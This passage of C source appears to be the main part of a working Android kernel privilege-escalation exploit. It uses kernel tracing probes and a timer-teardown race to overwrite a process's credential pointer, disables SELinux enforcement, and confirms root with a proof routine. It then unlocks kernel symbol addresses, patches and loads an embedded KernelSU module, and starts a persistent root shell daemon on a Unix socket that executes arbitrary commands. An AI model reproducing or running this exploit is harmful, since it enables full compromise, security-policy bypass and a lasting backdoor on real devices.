 struct sockaddr_un a;memset(&a,0,sizeof a);a.sun_family=AF_UNIX;a.sun_path[0]=0;
 strncpy(a.sun_path+1,ROOTD_SOCK,sizeof(a.sun_path)-2);
 socklen_t al=(socklen_t)(offsetof(struct sockaddr_un,sun_path)+1+strlen(ROOTD_SOCK));
 if(bind(fd,(struct sockaddr*)&a,al)<0){printf("ROOTD bind fail errno=%d\n",errno);fflush(stdout);close(fd);return -1;}
 if(listen(fd,8)<0){close(fd);return -1;}
 return fd;
}
static int rootd_connect(void){
 int fd=socket(AF_UNIX,SOCK_STREAM,0);
 if(fd<0)return -1;
 struct sockaddr_un a;memset(&a,0,sizeof a);a.sun_family=AF_UNIX;a.sun_path[0]=0;
 strncpy(a.sun_path+1,ROOTD_SOCK,sizeof(a.sun_path)-2);
 socklen_t al=(socklen_t)(offsetof(struct sockaddr_un,sun_path)+1+strlen(ROOTD_SOCK));
 if(connect(fd,(struct sockaddr*)&a,al)<0){close(fd);return -1;}
 return fd;
}
static int rootd_peer_uid(int fd){
 struct ucred cr; socklen_t cl=sizeof cr;
 if(getsockopt(fd,SOL_SOCKET,SO_PEERCRED,&cr,&cl)<0)return -1;
 return (int)cr.uid;
}
static void rootd_exec(int fd,const char*cmd){
 pid_t c=fork();
 if(c==0){dup2(fd,1);dup2(fd,2);execl("/system/bin/sh","sh","-c",cmd,(char*)0);_exit(127);}
 int st=0,done=0;
 for(int i=0;i<600;i++){pid_t r=waitpid(c,&st,WNOHANG);if(r==c){done=1;break;}msleep(50);}
 if(!done){kill(c,SIGKILL);dprintf(fd,"\n__EXIT=-1\n");return;}
 dprintf(fd,"\n__EXIT=%d\n",WIFEXITED(st)?WEXITSTATUS(st):-1);
}
static void rootd_main(void){
 {int lf=open("/data/local/tmp/o3p_rootd.log",O_WRONLY|O_CREAT|O_APPEND,0600);if(lf>=0){dup2(lf,1);dup2(lf,2);close(lf);}}
 printf("ROOTD start pid=%d uid=%d euid=%d sock=@%s\n",(int)getpid(),(int)getuid(),(int)geteuid(),ROOTD_SOCK);fflush(stdout);
 int srv=rootd_bind(); if(srv<0)return;
 printf("ROOTD listening\n");fflush(stdout);
 for(;;){
  int c=accept(srv,0,0);
  if(c<0){msleep(30);continue;}
  int uid=rootd_peer_uid(c);
  if(uid!=0&&uid!=2000){dprintf(c,"ERR denied uid=%d\n",uid);close(c);continue;}
  char cmd[1024];int n=0;char ch;
  while(n<(int)sizeof(cmd)-1){ssize_t r=read(c,&ch,1);if(r<=0)break;if(ch=='\n')break;cmd[n++]=ch;}
  cmd[n]=0;
  if(n==0){close(c);continue;}
  rootd_exec(c,cmd);
  close(c);
 }
}
static int rootd_client(const char*cmd){
 int fd=rootd_connect();
 if(fd<0){printf("CLIENT connect fail errno=%d\n",errno);fflush(stdout);return 1;}
 dprintf(fd,"%s\n",cmd);shutdown(fd,SHUT_WR);
 char b[4096];ssize_t n;
 while((n=read(fd,b,sizeof b-1))>0){b[n]=0;fputs(b,stdout);}
 close(fd);
 return 0;
}
static void rootd_cmd(const char*cmd){
 int fd=rootd_connect();
 if(fd<0){printf("ROOTD_OUT:[connect fail errno=%d]\n",errno);fflush(stdout);return;}
 dprintf(fd,"%s\n",cmd);shutdown(fd,SHUT_WR);
 char b[4096];ssize_t n;
 printf("ROOTD_OUT:[");fflush(stdout);
 while((n=read(fd,b,sizeof b-1))>0){b[n]=0;fputs(b,stdout);}
 printf("]\n");fflush(stdout);
 close(fd);
}
static void rootd_start(void){
 pid_t c=fork();
 if(c==0){execl(g_self,"o3p","--rootd",(char*)0);_exit(127);}
 printf("ROOTD fork=%d self=%s\n",(int)c,g_self);fflush(stdout);
 for(int i=0;i<40;i++){int fd=rootd_connect();if(fd>=0){close(fd);printf("ROOTD sock ready\n");fflush(stdout);break;}msleep(100);}
}
static void root_proof(void){
 printf("== ROOT PROOF\n");fflush(stdout);
 run_sh("id; echo ---; grep -E '^(Uid|Gid|CapEff|CapPrm|CapBnd):' /proc/self/status; echo ---; getenforce; echo ---; cat /proc/sys/kernel/random/boot_id","/data/local/tmp/o3p_proof.txt",4000);
 read_file_print("/data/local/tmp/o3p_proof.txt","PROOFFILE");
}

/* ==== KernelSU LKM: runtime relink + finit_module ==== */
#define KSU_SHN_ABS 0xfff1
static int g_relink_skip_syms=0;

static void stage_note(const char *s){
  int fd=open("/data/local/tmp/o3p_stage.txt",O_WRONLY|O_CREAT|O_APPEND,0644);
  if(fd<0)return;
  char b[192]; int n=snprintf(b,sizeof b,"%s\n",s);
  if(n>0)write(fd,b,n);
  fsync(fd); close(fd);
}

static unsigned char *ksu_blob_load(size_t *plen){
  int fd=open("/proc/self/exe",O_RDONLY); if(fd<0)return NULL;
  off_t end=lseek(fd,0,SEEK_END);
  struct ksu_trailer { char m[8]; unsigned long long off,len; } tr;
  if(end<(off_t)sizeof tr){close(fd);return NULL;}
  lseek(fd,(off_t)(end-(off_t)sizeof tr),SEEK_SET);
  if(read(fd,&tr,sizeof tr)!=(ssize_t)sizeof tr){close(fd);return NULL;}
  if(memcmp(tr.m,"O3KSKO01",8)||tr.len==0||tr.len>(8u<<20)||tr.off+(unsigned long long)tr.len>(unsigned long long)end){close(fd);return NULL;}
  unsigned char *b=(unsigned char*)malloc(tr.len);
  if(!b){close(fd);return NULL;}
  lseek(fd,(off_t)tr.off,SEEK_SET);
  size_t got=0;
  while(got<tr.len){ssize_t r=read(fd,b+got,tr.len-got); if(r<=0)break; got+=r;}
  close(fd);
  if(got!=tr.len){free(b);return NULL;}
  *plen=tr.len; return b;
}

static int ksu_patch(unsigned char *d,size_t len,unsigned long long slide){
  unsigned long long shoff; unsigned short shentsize=0,shnum=0;
  if(len<64||d[0]!=0x7f||d[1]!='E')return -1;
  memcpy(&shoff,d+0x28,8); memcpy(&shentsize,d+0x3a,2); memcpy(&shnum,d+0x3c,2);
  if(shentsize<64||shnum==0||shnum>64)return -2;
  if(shoff+(unsigned long long)shentsize*shnum>len)return -3;
  int found=0,missing=0,strs=0;
  for(int i=0;i<shnum;i++){
    unsigned char *sh=d+shoff+(size_t)i*shentsize;
    unsigned int type; memcpy(&type,sh+4,4);
    if(type!=2||g_relink_skip_syms)continue;
    unsigned long long soff,ssize,entsize; unsigned int link;
    memcpy(&soff,sh+0x18,8); memcpy(&ssize,sh+0x20,8); memcpy(&link,sh+0x28,4); memcpy(&entsize,sh+0x38,8);
    if(entsize<24||link>=shnum||soff+ssize>len)return -4;
    unsigned char *shr=d+shoff+(size_t)link*shentsize;
    unsigned long long stoff,stsize;
    memcpy(&stoff,shr+0x18,8); memcpy(&stsize,shr+0x20,8);
    if(stoff+stsize>len)return -5;
    const char *str=(const char*)(d+stoff);
    size_t n=(size_t)(ssize/entsize);
    for(size_t k=0;k<n;k++){
      unsigned char *s=d+soff+k*entsize;
      unsigned int nameoff; memcpy(&nameoff,s,4);
      unsigned short shndx; memcpy(&shndx,s+6,2);
      if(shndx!=0||nameoff==0||nameoff>=stsize)continue;
      const char *nm=str+nameoff;
      int hit=-1;
      for(int j=0;j<KSU_SYM_COUNT;j++){ if(!strcmp(ksu_syms[j].name,nm)){hit=j;break;} }
      if(hit<0){missing++;continue;}
      unsigned short abs=KSU_SHN_ABS; memcpy(s+6,&abs,2);
      unsigned long long v=ksu_syms[hit].addr+slide; memcpy(s+8,&v,8);
      found++;
    }
    strs++;
  }
  { unsigned int shstrndx=0; memcpy(&shstrndx,d+0x3e,2);
    int cd_patch=-1; unsigned long long cd_off=0;
    unsigned int init_idx=0xffffffffu; unsigned long long init_off=0,init_size=0;
    if(shstrndx<shnum){ unsigned char *shs=d+shoff+(size_t)shstrndx*shentsize; unsigned long long so=0,ss=0;
      memcpy(&so,shs+0x18,8); memcpy(&ss,shs+0x20,8);
      if(so+ss<=len) for(unsigned i2=0;i2<shnum;i2++){ unsigned char *sh2=d+shoff+(size_t)i2*shentsize; unsigned int no2=0; memcpy(&no2,sh2,4);
        if(no2>=ss)continue; const char *nm2=(const char*)(d+so+no2);
        if(strcmp(nm2,".init.text"))continue;
        memcpy(&init_off,sh2+0x18,8); memcpy(&init_size,sh2+0x20,8); init_idx=i2; break; } }
    if(init_idx!=0xffffffffu){
      for(unsigned i2=0;i2<shnum;i2++){
        unsigned char *sh2=d+shoff+(size_t)i2*shentsize; unsigned int type2=0; memcpy(&type2,sh2+4,4);
        if(type2!=4)continue;
        unsigned int info2=0; memcpy(&info2,sh2+0x2c,4);
        if(info2!=init_idx)continue;
        unsigned int link2=0; memcpy(&link2,sh2+0x28,4);
        unsigned long long roff=0,rsize=0,rentsize=24; memcpy(&roff,sh2+0x18,8); memcpy(&rsize,sh2+0x20,8); memcpy(&rentsize,sh2+0x38,8);
        if(rentsize<24||link2>=shnum||roff+rsize>len)continue;
        unsigned char *symh=d+shoff+(size_t)link2*shentsize; unsigned long long syoff=0,sysize=0,syentsize=24;
        memcpy(&syoff,symh+0x18,8); memcpy(&sysize,symh+0x20,8); memcpy(&syentsize,symh+0x38,8);
        if(syentsize<24||syoff+sysize>len)continue;
        unsigned int strlink=0; memcpy(&strlink,symh+0x28,4);
        if(strlink>=shnum)continue;
        unsigned char *strh=d+shoff+(size_t)strlink*shentsize; unsigned long long stroff=0,strsize=0;
        memcpy(&stroff,strh+0x18,8); memcpy(&strsize,strh+0x20,8);
        if(stroff+strsize>len)continue;
        const char *strtab=(const char*)(d+stroff);
        size_t nr=(size_t)(rsize/rentsize);
        for(size_t k=0;k<nr;k++){
          unsigned char *re=d+roff+k*rentsize; unsigned long long r_off=0,r_info=0;
          memcpy(&r_off,re,8); memcpy(&r_info,re+8,8);
          unsigned int symidx=(unsigned int)(r_info>>32);
          if((unsigned long long)symidx*syentsize+(unsigned long long)syentsize>sysize)continue;
          unsigned int nmoff=0; memcpy(&nmoff,d+syoff+(unsigned long long)symidx*syentsize,4);
          if(nmoff==0||nmoff>=strsize)continue;
          if(strcmp(strtab+nmoff,"setenforce"))continue;
          if(r_off<4||r_off>init_size)continue;
          { unsigned long long cand=init_off+(r_off-4);
            if(cand+4<=len){ unsigned char *q2=d+cand;
              if(q2[0]==0x20&&q2[1]==0x00&&q2[2]==0x80&&q2[3]==0x52){ q2[0]=0x00; cd_patch=1; cd_off=cand; }
              else if(cd_patch<0){ cd_patch=-2; cd_off=cand; } } }
          if(cd_patch==1)break;
        }
        if(cd_patch==1)break;
      }
      if(cd_patch<0){ int hits=0; unsigned long long hitoff=0;
        if(init_off+init_size<=len) for(unsigned long long p=0;p+8<=init_size;p++){
          unsigned char *q=d+init_off+p;
          if(q[0]==0x20&&q[1]==0x00&&q[2]==0x80&&q[3]==0x52){ unsigned int w=0; memcpy(&w,q+4,4);
            if((w&0xfc000000u)==0x94000000u){ hits++; hitoff=init_off+p; } } }
        if(hits==1){ unsigned char *q2=d+hitoff; if(q2[0]==0x20&&q2[1]==0x00&&q2[2]==0x80&&q2[3]==0x52){ q2[0]=0x00; cd_patch=1; cd_off=hitoff; } }
      }
    }
    printf("KSU_CODEPATCH mov_w0_zero=%d off=0x%llx",cd_patch,cd_off);putchar(10);fflush(stdout);
    {char m2[128];snprintf(m2,sizeof m2,"KSU_CODEPATCH r=%d off=0x%llx",cd_patch,cd_off);stage_note(m2);} }
  printf("KSU_PATCH symtabs=%d found=%d missing=%d skip=%d\n",strs,found,missing,g_relink_skip_syms);fflush(stdout);
  {char m[96];snprintf(m,sizeof m,"KSU_PATCH_OK found=%d missing=%d",found,missing);stage_note(m);}
  return g_relink_skip_syms?0:(found>0?0:-6);
}

static void ksu_modlist(void){
  int fd=open("/proc/modules",O_RDONLY);
  if(fd<0){printf("KSU_MODULE UNKNOWN\n");fflush(stdout);return;}
  char b[8192]; ssize_t n=read(fd,b,sizeof b-1); close(fd);
  if(n<=0){printf("KSU_MODULE UNKNOWN\n");fflush(stdout);return;}
  b[n]=0;
  printf("KSU_MODULE %s\n",strstr(b,"kernelsu")?"LIVE":"ABSENT");fflush(stdout);
}


/* ---- dynamic loader: resolve UNDEF via /proc/kallsyms (kptr_restrict cleared temporarily) ---- */
struct ksym_t { char name[128]; unsigned long long addr; int used; };
static unsigned ksym_hash(const char *s){ unsigned h=5381u; while(*s){h=h*33u^(unsigned char)*s++;} return h; }
static int kptr_get(void){ int fd=open("/proc/sys/kernel/kptr_restrict",O_RDONLY); if(fd<0)return -1; char b[16]; int n=(int)read(fd,b,15); close(fd); if(n<=0)return -1; b[n]=0; return atoi(b); }
static int kptr_set(int v){ int fd=open("/proc/sys/kernel/kptr_restrict",O_WRONLY); if(fd<0)return -1; char b[16]; int n=snprintf(b,sizeof b,"%d\n",v) ; ssize_t w=write(fd,b,(size_t)n); close(fd); return w==n?0:-1; }
static int kallsyms_patch(unsigned char *d,size_t len,int *pfound,int *pmissing){
  static struct ksym_t tab[2048];
  memset(tab,0,sizeof tab);
  if(len<64||d[0]!=0x7f)return -1;
  unsigned long long shoff; unsigned short shentsize=0,shnum=0;
  memcpy(&shoff,d+0x28,8); memcpy(&shentsize,d+0x3a,2); memcpy(&shnum,d+0x3c,2);
  if(shentsize<64||shnum==0||shnum>64)return -2;
  if(shoff+(unsigned long long)shentsize*shnum>len)return -3;
  int tcount=0,found=0,missing=0,i,k;
  for(i=0;i<shnum;i++){
    unsigned char *sh=d+shoff+(size_t)i*shentsize; unsigned int type=0; memcpy(&type,sh+4,4);
    if(type!=2)continue;
    unsigned long long soff=0,ssize=0,entsize=24; unsigned int link=0;
    memcpy(&soff,sh+0x18,8); memcpy(&ssize,sh+0x20,8); memcpy(&link,sh+0x28,4); memcpy(&entsize,sh+0x38,8);
    if(entsize<24||link>=shnum||soff+ssize>len)continue;
    unsigned char *shr=d+shoff+(size_t)link*shentsize; unsigned long long stoff=0,stsize=0;
    memcpy(&stoff,shr+0x18,8); memcpy(&stsize,shr+0x20,8);
    if(stoff+stsize>len)continue;
    const char *str=(const char*)(d+stoff);
    size_t n=(size_t)(ssize/entsize);
    for(size_t kk=0;kk<n;kk++){
      unsigned char *sy=d+soff+kk*entsize; unsigned int no=0; unsigned short shndx=0;
      memcpy(&no,sy,4); memcpy(&shndx,sy+6,2);
      if(shndx!=0||no==0||no>=stsize)continue;
      const char *nm=str+no; unsigned h=ksym_hash(nm)&2047u; int slot=-1;
      for(k=0;k<8;k++){ unsigned idx=(h+(unsigned)k)&2047u; if(!tab[idx].used){slot=(int)idx;break;} if(!strcmp(tab[idx].name,nm)){slot=(int)idx;break;} }
      if(slot<0||tcount>=2000)return -7;
      if(!tab[slot].used){ tab[slot].used=1; snprintf(tab[slot].name,sizeof tab[slot].name,"%s",nm); tab[slot].addr=0; tcount++; }
    }
  }
  int old=kptr_get(); if(old<0)return -8;
  if(old!=0 && kptr_set(0))return -8;
  { FILE *f=fopen("/proc/kallsyms","r"); if(!f){ if(old!=0)kptr_set(old); return -9; }
    char line[512];
    while(fgets(line,sizeof line,f)){
      unsigned long long a=0; char t=0; char nm[130];
      if(sscanf(line,"%llx %c %129s",&a,&t,nm)!=3)continue;
      if(!a)continue;
      unsigned h=ksym_hash(nm)&2047u;
      for(k=0;k<8;k++){ unsigned idx=(h+(unsigned)k)&2047u; if(!tab[idx].used)break; if(!strcmp(tab[idx].name,nm)){ if(!tab[idx].addr)tab[idx].addr=a; break; } }
    }
    fclose(f);
  }
  if(old!=0)kptr_set(old);
  for(i=0;i<2048;i++) if(tab[i].used&&!tab[i].addr) missing++;
  for(i=0;i<shnum;i++){
    unsigned char *sh=d+shoff+(size_t)i*shentsize; unsigned int type=0; memcpy(&type,sh+4,4);
    if(type!=2)continue;
    unsigned long long soff=0,ssize=0,entsize=24; unsigned int link=0;
    memcpy(&soff,sh+0x18,8); memcpy(&ssize,sh+0x20,8); memcpy(&link,sh+0x28,4); memcpy(&entsize,sh+0x38,8);
    unsigned char *shr=d+shoff+(size_t)link*shentsize; unsigned long long stoff=0,stsize=0;
    memcpy(&stoff,shr+0x18,8); memcpy(&stsize,shr+0x20,8);
    const char *str=(const char*)(d+stoff);
    size_t n=(size_t)(ssize/entsize);
    for(size_t kk=0;kk<n;kk++){
      unsigned char *sy=d+soff+kk*entsize; unsigned int no=0; unsigned short shndx=0;
      memcpy(&no,sy,4); memcpy(&shndx,sy+6,2);
      if(shndx!=0||no==0||no>=stsize)continue;
      const char *nm=str+no; unsigned h=ksym_hash(nm)&2047u;
      for(k=0;k<8;k++){ unsigned idx=(h+(unsigned)k)&2047u; if(!tab[idx].used)break; if(!strcmp(tab[idx].name,nm)){ if(tab[idx].addr){ unsigned short abs=KSU_SHN_ABS; memcpy(sy+6,&abs,2); memcpy(sy+8,&tab[idx].addr,8); found++; } break; } }
    }
  }
  *pfound=found; *pmissing=missing;
  printf("KALLSYMS_PATCH found=%d missing=%d\n",found,missing);fflush(stdout);
  return 0;
}

static int ksu_load(unsigned long long slide){
  stage_note("KSU_BEGIN");
  wf("/proc/sys/kernel/panic_on_oops","0\n");
  size_t len=0;
  unsigned char *b=ksu_blob_load(&len);
  if(!b){printf("KSU_BLOB MISSING\n");fflush(stdout);return -1;}
  printf("KSU_BLOB len=%zu slide=0x%llx\n",len,slide);fflush(stdout);
  stage_note("KSU_BLOB_OK");
  int ksf=0,ksm=0,ksfound=0;
  int kres=-1;
  if(!getenv("O3P_RELINK_ONLY")){ kres=kallsyms_patch(b,len,&ksfound,&ksm); }
  if(kres==0 && ksm==0){ printf("KSU_LOADER kallsyms found=%d missing=0\n",ksfound);fflush(stdout); stage_note("KSU_LOADER_KALLSYMS"); }
  else {
    printf("KSU_LOADER relink (kallsyms r=%d missing=%d)\n",kres,ksm);fflush(stdout);
    int r=ksu_patch(b,len,slide);
    if(r){printf("KSU_PATCH_FAIL r=%d\n",r);fflush(stdout);free(b);return -1;}
  }
  if(kres==0 && ksm==0){ g_relink_skip_syms=1; ksu_patch(b,len,slide); g_relink_skip_syms=0; }
  const char *out="/data/local/tmp/o3p_ksu.ko";
  int fd=open(out,O_WRONLY|O_CREAT|O_TRUNC,0644);
  if(fd<0){printf("KSU_WRITE_FAIL errno=%d\n",errno);fflush(stdout);free(b);return -1;}
  size_t w=0;
  while(w<len){ssize_t x=write(fd,b+w,len-w); if(x<=0)break; w+=x;}
  fsync(fd); close(fd); free(b);
  printf("KSU_WROTE %s %zu\n",out,w);fflush(stdout);
  if(w!=len)return -1;
  stage_note("KSU_EXEC_GO");
  pid_t cp=fork();
  if(cp==0){
    execl("/system/bin/sh","sh","-c","insmod /data/local/tmp/o3p_ksu.ko >/data/local/tmp/o3p_insmod.out 2>&1; echo rc=$? >>/data/local/tmp/o3p_insmod.out",(char*)0);
    _exit(127);
  }
  int st=0; int done=0;
  for(int i=0;i<160;i++){ pid_t r=waitpid(cp,&st,WNOHANG); if(r==cp){done=1;break;} msleep(250); }
  printf("KSU_EXEC done=%d status=0x%x\n",done,st);fflush(stdout);
  {char m[96];snprintf(m,sizeof m,"KSU_EXEC done=%d status=0x%x",done,st);stage_note(m);}
  read_file_print("/data/local/tmp/o3p_insmod.out","KSU_INSMOD_OUT");
  ksu_modlist();
  return done?0:-1;
}

static void reap_calib(pid_t pid){
 printf("== reap window stage=%d\n",g_stage);fflush(stdout);
 trunc_trace();wf(TR"/tracing_on","1\n");
 int st=0;pid_t wr=waitpid(pid,&st,0);
 repair_fake_cred();
 wf(TR"/tracing_on","0\n");
 tlen=read_trace(tbuf,48u<<20);
 printf("waitpid=%d status=%d trace=%zu\n",(int)wr,st,tlen);fflush(stdout);
 if(g_selmode&&g_stage==0){
  unsigned long long ad[6],vv[6];int n=0;
  ad[n++]=g_sel;ad[n++]=g_sel+0x08;ad[n++]=g_sel+0x40;ad[n++]=PTASK+0x908;ad[n++]=PTASK+0x900;ad[n++]=g_fakekva;
  int g=read_addrs(ad,vv,n);
  printf("SELREAD got=%d\n",g);fflush(stdout);
  if(g>0){int k;
   for(k=0;k<n;k++)printf("  Q[%d] 0x%llx = 0x%llx\n",k,ad[k],vv[k]);
   {unsigned long long ex=g_fakekva|0x100ULL;
    int ok=(vv[0]==ex)&&((vv[0]&0xffULL)==0ULL)&&(((vv[0]>>8)&0xffULL)!=0ULL);
    printf("SELWRITE target=0x%llx want=0x%llx val=0x%llx %s\n",ad[0],ex,vv[0],ok?"SEL_OK":"SEL_FAIL");
    if(ok)g_stage++;}
  }
  read_file_print("/sys/fs/selinux/enforce","ENFORCE");
  {int fd=open("/data/local/tmp/canary_t34",O_WRONLY|O_CREAT,0666);printf("SHELL_CREATE fd=%d\n",fd);if(fd>=0)close(fd);}
  fflush(stdout);
  close_skb();kill(-pid,SIGKILL);msleep(50);while(waitpid(-1,0,WNOHANG)>0){}
  return;
 }
 {unsigned long long ad[12],vv[12];int n=0;
  ad[n++]=PTASK+0x908;ad[n++]=PTASK+0x900;ad[n++]=g_fakekva+0x00;ad[n++]=g_fakekva+0x08;ad[n++]=g_fakekva+0x10;ad[n++]=g_fakekva+0x18;ad[n++]=g_fakekva+0x20;ad[n++]=g_fakekva+0x38;ad[n++]=g_fakekva+0x40;ad[n++]=g_fakekva+0x80;
  int g=read_addrs(ad,vv,n);
  printf("post got=%d\n",g);
  if(g>0){int k;for(k=0;k<n;k++)printf("  P[%d] 0x%llx = 0x%llx\n",k,ad[k],vv[k]);
   {int ok=(vv[0]==g_fakekva);
    printf("CREDPTR target=0x%llx val=0x%llx %s\n",ad[0],vv[0],ok?"PTR_OK":"PTR_FAIL");
    printf("FAKECRED usage=0x%llx uidgid=0x%llx suid=0x%llx euid=0x%llx fsuid=0x%llx capP=0x%llx capE=0x%llx sec=0x%llx\n",vv[2],vv[3],vv[4],vv[5],vv[6],vv[7],vv[8],vv[9]);
    if(ok)g_armed=1;}
  }
 }
 printf("UIDNOW uid=%d euid=%d gid=%d\n",(int)getuid(),(int)geteuid(),(int)getgid());
 {struct __user_cap_header_struct hh;struct __user_cap_data_struct dd[2];memset(dd,0,sizeof dd);hh.version=_LINUX_CAPABILITY_VERSION_3;hh.pid=0;
  int cr=(int)syscall(SYS_capget,&hh,dd);
  printf("CAPGET r=%d eff0=0x%x eff1=0x%x prm1=0x%x bnd1=0x%x\n",cr,dd[0].effective,dd[1].effective,dd[1].permitted,dd[1].inheritable);fflush(stdout);}
 if(g_armed){
  root_proof();
  stage_note("ROOT_OK");
  if(g_un){ if(!getenv("O3P_NOKSU")) ksu_load(g_un-INIT_USER_NS_STATIC); } else { printf("KSU_SKIP no_slide\n");fflush(stdout); }
  if(access("/data/local/tmp/o3p_post.sh",F_OK)==0){run_sh("sh /data/local/tmp/o3p_post.sh","/data/local/tmp/o3p_post.out",25000);read_file_print("/data/local/tmp/o3p_post.out","POSTOUT");}
  rootd_start();rootd_cmd("id; echo ---; getenforce");
 }
 close_skb();kill(-pid,SIGKILL);msleep(50);while(waitpid(-1,0,WNOHANG)>0){}
}
static void perf_prepare(void){
 trunc_trace();
 probe_on_r("o3pp","rb","rb_alloc user_page=+0x118($retval):x64");
 trunc_trace();wf(TR"/tracing_on","1\n");
 struct perf_event_attr pe;memset(&pe,0,sizeof pe);
 pe.type=PERF_TYPE_SOFTWARE;pe.size=sizeof(pe);pe.config=PERF_COUNT_SW_CPU_CLOCK;pe.disabled=1;pe.exclude_kernel=1;pe.exclude_hv=1;
 int fd=(int)syscall(SYS_perf_event_open,&pe,0,-1,-1,0);
 void*mp=0; if(fd>=0)mp=mmap(0,4096,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
 wf(TR"/tracing_on","0\n");
 size_t tl=read_trace(tbuf,16u<<20);
 unsigned long long kva=0;
 {char*s=0;for(char*line=strtok_r(tbuf,"\n",&s);line;line=strtok_r(NULL,"\n",&s)){if(!strstr(line," rb: ("))continue;unsigned long long v=field_u64(line,"user_page=");if(v){kva=v;break;}}}
 del_ev("o3pp","rb");
 printf("PERFPAGE fd=%d map=%p kva=0x%llx bytes=%zu\n",fd,mp,kva,tl);fflush(stdout);
 if(fd>=0&&mp&&mp!=MAP_FAILED&&kva){g_pfd=fd;g_pmap=mp;g_fakekva=kva;((volatile char*)mp)[0]=0;((volatile char*)mp)[4095]=0;}
}

int main(int argc,char**argv){
 if(argc>1&&!strcmp(argv[1],"--rootd")){rootd_main();return 0;}
 if(argc>2&&!strcmp(argv[1],"--shell")){return rootd_client(argv[2]);}
 {ssize_t rl=readlink("/proc/self/exe",g_self,sizeof g_self-1);if(rl>0)g_self[rl]=0;}
 if(argc>1&&!strcmp(argv[1],"--exec-target"))_exit(0);
 if(argc>1)NFILL=atoi(argv[1]);
 if(argc>2)g_pairs=atoi(argv[2]);
 if(argc>3)g_delay=atoi(argv[3]);
 if(argc>4)g_mode=atoi(argv[4]);
 if(argc>5)g_att=atoi(argv[5]);
 if(argc>6)g_reps=atoi(argv[6]);
 if(argc>7)g_churn=atoi(argv[7]);
 if(argc>8)g_chwait=atoi(argv[8]);
 if(NFILL<1)NFILL=1;if(NFILL>NFILL_MAX)NFILL=NFILL_MAX;
  if(getenv("O3P_NOSEL"))g_selmode=0;g_ntg=g_selmode?2:1;
 setvbuf(stdout,0,_IONBF,0);
 { struct rlimit rl; rl.rlim_cur=524288; rl.rlim_max=524288; setrlimit(RLIMIT_NOFILE,&rl); }
 {char bb[96];int n=0;int fd=open("/proc/sys/kernel/random/boot_id",O_RDONLY);if(fd>=0){n=(int)read(fd,bb,95);close(fd);}if(n>0){int i2=0;while(i2<n && bb[i2]!=10 && bb[i2]!=13)i2++;fputs("BOOTID ",stdout);for(int k2=0;k2<i2;k2++)putchar(bb[k2]);putchar(10);fflush(stdout);}}
 tbuf=malloc(48u<<20);
 if(!tbuf){printf("malloc fail\n");return 1;}
 prctl(PR_SET_CHILD_SUBREAPER,1,0,0,0);
 pin(0);
 printf("== cleanup old probes\n");fflush(stdout);
 del_ev("o3p","tm");del_ev("o3p","x");del_ev("o3p","fr");del_ev("o3p","ei");del_ev("o3p","rl");del_ev("o3p","td");del_ev("o3p","pe");del_ev("o3p","ds");del_ev("o3p","al");del_ev("o3pp","rb");del_ev("t2r","r");
 wf(TR"/buffer_size_kb","32768\n");
 printf("== add probes\n");fflush(stdout);
 probe_on("o3p","tm","do_timer_create+0x68 a0=%x0:x64");
 probe_on("o3p","x","__set_task_comm ts=%x0:x64 h=+0x8a0(%x0):x64 l=+0x8a8(%x0):x64");
 probe_on("o3p","fr","posix_timer_unhash_and_free t=%x0:x64");
 probe_on("o3p","ei","exit_itimers s=%x0:x64");
 probe_on("o3p","rl","release_task t=%x0:x64");
 probe_on("o3p","td","timerqueue_del h=%x0:x64 n=%x1:x64 np=+0(%x1):x64 nh=+0x20(%x1):x64");
 probe_on("o3p","pe","posix_cpu_timers_exit t=%x0:x64 h=+0x8a0(%x0):x64 l=+0x8a8(%x0):x64");
 probe_on("o3p","ds","discard_slab slab=%x1:x64");
 perf_prepare();
 int armed=0;pid_t armed_pid=0;
 for(int att=1;att<=g_att;att++){
   if(g_ntg>0&&g_stage>=g_ntg)break;
   armed=0;
   if(do_attempt(att,&armed_pid)==0){
     armed=1;
     printf("== armed, reap\n");fflush(stdout);
     reap_calib(armed_pid);
      printf("UIDNOW uid=%d euid=%d gid=%d\n",(int)getuid(),(int)geteuid(),(int)getgid());fflush(stdout);
      if(g_armed)break;
   } else msleep(200);
 }
 printf("FULLROOT armed=%d fakekva=0x%llx\n",g_armed,g_fakekva);fflush(stdout);
printf("== cleanup\n");fflush(stdout);
 del_ev("o3p","tm");del_ev("o3p","x");del_ev("o3p","fr");del_ev("o3p","ei");del_ev("o3p","rl");del_ev("o3p","td");del_ev("o3p","pe");del_ev("o3p","ds");del_ev("o3p","al");del_ev("o3pp","rb");del_ev("t2r","r");
 wf(TR"/tracing_on","0\n");
 while(waitpid(-1,0,WNOHANG)>0){}
 printf("done\n");
 return 0;
}
